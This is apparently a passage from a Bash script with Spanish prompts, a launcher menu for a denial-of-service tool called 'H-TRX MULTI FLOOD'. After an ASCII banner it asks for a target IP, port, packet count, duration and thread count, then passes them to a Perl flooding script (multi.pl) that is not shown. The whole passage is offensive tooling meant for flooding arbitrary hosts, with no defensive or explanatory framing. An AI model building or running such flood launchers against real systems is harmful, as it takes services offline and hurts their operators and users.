}

multi()
{
    clear
    echo -e " $LIGHTCYAN} "
    echo "               H-TRX MULTI FLOOD UPDATED "   
    echo "Script"
    echo ""	
    echo -e "        '||    ||'          '||    .    || " 
    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
    echo ""
    echo "    El que se atreva a jugar a dios debe pagar un alto precio."
    echo ""
echo "Introduzca la ip :"
read ip
echo "Introduzca el puerto :"
read port
echo "Introduzca el numero de paquetes: 65500"
read size
echo "Introduzca el tiempo :"
read time
echo "Ingrese el numero de hilos :"
read threads
echo "Le gustaria ver la salida ADVERTENCIA si si la inundacion puede disminuir 0 = No 1 = Si"
read output
perl multi.pl $ip $port $size $time $threads $output
}

